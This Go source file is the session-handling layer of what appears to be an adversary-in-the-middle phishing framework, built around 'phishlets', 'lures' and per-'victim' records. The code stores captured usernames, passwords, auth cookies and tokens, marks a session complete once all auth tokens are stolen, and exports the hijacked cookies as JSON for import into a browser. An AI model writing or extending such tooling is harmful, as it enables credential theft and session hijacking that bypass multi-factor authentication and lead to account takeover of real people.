package aitm

import (
	"encoding/json"
	"time"
)

// SessionStore is the persistence interface required by SessionService.
// Implementations must be safe for concurrent use.
type SessionStore interface {
	CreateSession(session *Session) error
	GetSession(id string) (*Session, error)
	UpdateSession(session *Session) error
	DeleteSession(id string) error
	ListSessions(filter SessionFilter) ([]*Session, error)
}

// SessionFilter scopes a ListSessions call.
type SessionFilter struct {
	Phishlet       string
	CompletedOnly  bool
	IncompleteOnly bool
	After          time.Time // zero means no lower bound
	Before         time.Time // zero means no upper bound
	Limit          int       // 0 means no limit
	Offset         int
}

// Session is the server-side record for a single victim visit.
type Session struct {
	ID           string
	Phishlet     string
	LureID       string
	RedirectURL  string // resolved at session creation from the lure's RedirectURL
	RemoteAddr   string
	UserAgent    string
	JA4Hash      string
	BotScore     float64
	Username     string
	Password     string
	Custom       map[string]string
	CookieTokens map[string]map[string]*CookieToken // domain → name → token
	BodyTokens   map[string]string
	HttpTokens   map[string]string
	PuppetID     string
	StartedAt    time.Time
	CompletedAt  *time.Time // nil until all auth_tokens are captured
}

// LureRedirectURL returns the URL to redirect the victim to after session completion.
func (s *Session) LureRedirectURL() string { return s.RedirectURL }

// IsDone returns true when all required auth tokens have been captured.
func (s *Session) IsDone() bool { return s.CompletedAt != nil }

// HasCredentials returns true if at least a username has been captured.
func (s *Session) HasCredentials() bool { return s.Username != "" }

// Complete marks the session as done with the current timestamp.
func (s *Session) Complete() {
	now := time.Now()
	s.CompletedAt = &now
}

// AddCookieToken stores a captured cookie, initialising nested maps as needed.
func (s *Session) AddCookieToken(domain, name string, tok *CookieToken) {
	if s.CookieTokens == nil {
		s.CookieTokens = make(map[string]map[string]*CookieToken)
	}
	if s.CookieTokens[domain] == nil {
		s.CookieTokens[domain] = make(map[string]*CookieToken)
	}
	s.CookieTokens[domain][name] = tok
}

// ExportCookies returns all captured cookies as a flat list in the format
// expected by the StorageAce browser import extension.
func (s *Session) ExportCookies() []CookieExport {
	var out []CookieExport
	for _, byName := range s.CookieTokens {
		for _, token := range byName {
			out = append(out, CookieExport{
				Name:     token.Name,
				Value:    token.Value,
				Domain:   token.Domain,
				Path:     token.Path,
				Expires:  token.Expires.Unix(),
				HttpOnly: token.HttpOnly,
				Secure:   token.Secure,
				SameSite: token.SameSite,
			})
		}
	}
	return out
}

// CookieToken is a single captured cookie value.
type CookieToken struct {
	Name     string
	Value    string
	Path     string
	Domain   string
	Expires  time.Time
	HttpOnly bool
	Secure   bool
	SameSite string
}

// CookieExport is the wire format for the StorageAce browser import extension.
type CookieExport struct {
	Name     string `json:"name"`
	Value    string `json:"value"`
	Domain   string `json:"domain"`
	Path     string `json:"path"`
	Expires  int64  `json:"expirationDate"`
	HttpOnly bool   `json:"httpOnly"`
	Secure   bool   `json:"secure"`
	SameSite string `json:"sameSite"`
}

// SessionService owns all business logic for session lifecycle.
type SessionService struct {
	store SessionStore
	bus   EventBus
}

func NewSessionService(store SessionStore, bus EventBus) *SessionService {
	return &SessionService{store: store, bus: bus}
}

func (s *SessionService) Create(session *Session) error {
	if err := s.store.CreateSession(session); err != nil {
		return err
	}
	s.bus.Publish(Event{Type: EventSessionCreated, OccurredAt: time.Now(), Payload: session})
	return nil
}

func (s *SessionService) Complete(id string) error {
	session, err := s.store.GetSession(id)
	if err != nil {
		return err
	}
	session.Complete()
	if err := s.store.UpdateSession(session); err != nil {
		return err
	}
	s.bus.Publish(Event{Type: EventSessionCompleted, OccurredAt: time.Now(), Payload: session})
	return nil
}

func (s *SessionService) Get(id string) (*Session, error) {
	return s.store.GetSession(id)
}

func (s *SessionService) List(f SessionFilter) ([]*Session, error) {
	return s.store.ListSessions(f)
}

func (s *SessionService) Delete(id string) error {
	return s.store.DeleteSession(id)
}

// ExportCookiesJSON returns the captured cookies for a session as a JSON byte
// slice ready to be sent to the API caller or written to a file.
func (s *SessionService) ExportCookiesJSON(id string) ([]byte, error) {
	session, err := s.store.GetSession(id)
	if err != nil {
		return nil, err
	}
	return json.Marshal(session.ExportCookies())
}
